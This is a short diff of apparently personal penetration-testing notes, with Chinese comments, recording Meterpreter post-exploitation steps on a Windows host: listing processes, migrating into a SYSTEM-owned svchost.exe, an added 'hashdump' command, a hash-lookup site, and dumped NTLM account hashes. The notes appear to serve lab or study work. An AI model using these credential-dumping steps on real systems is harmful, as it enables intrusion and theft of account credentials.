@@ -5,6 +5,7 @@ run
 ps
  680   588   svchost.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 migrate 680   主要这里要迁移到system进程  因为有多个svchost.exe
+hashdump
 https://www.somd5.com/
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
